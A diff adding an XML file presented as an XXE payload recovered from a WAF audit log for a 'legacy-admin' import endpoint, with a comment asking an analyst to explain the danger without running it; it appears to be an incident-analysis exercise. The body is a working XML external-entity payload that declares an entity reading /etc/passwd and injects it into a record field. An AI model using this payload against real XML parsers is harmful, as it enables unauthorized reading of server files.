@@ -1,0 +1,33 @@
+<!--
+SANKOFA DIGITAL - WAF AUDIT LOG RECOVERY
+Artefact: legacy-admin XML import submitted to /legacy-admin/import.php
+Recovered by: Tunde Afolabi
+
+Tunde: "Treat this as the exact body recovered from the WAF audit
+event at 2024-06-04T02:23:41Z. Do not run it anywhere. Explain
+which parser feature makes it dangerous, what file it tries to read,
+and which HTTP capture entry shows the attacker testing the same file
+read idea through the web UI."
+-->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE sankofaImport [
+  <!ELEMENT sankofaImport (job, submitted_by, records)>
+  <!ELEMENT job (#PCDATA)>
+  <!ELEMENT submitted_by (#PCDATA)>
+  <!ELEMENT records (record+)>
+  <!ELEMENT record (field+)>
+  <!ELEMENT field (#PCDATA)>
+  <!ATTLIST field name CDATA #REQUIRED>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<sankofaImport>
+  <job>customer-pii-backfill-2024-06</job>
+  <submitted_by>legacy-admin</submitted_by>
+  <records>
+    <record>
+      <field name="customer_id">TEST-IMPORT-001</field>
+      <field name="full_name">Parser Smoke Test</field>
+      <field name="notes">&xxe;</field>
+    </record>
+  </records>
+</sankofaImport>
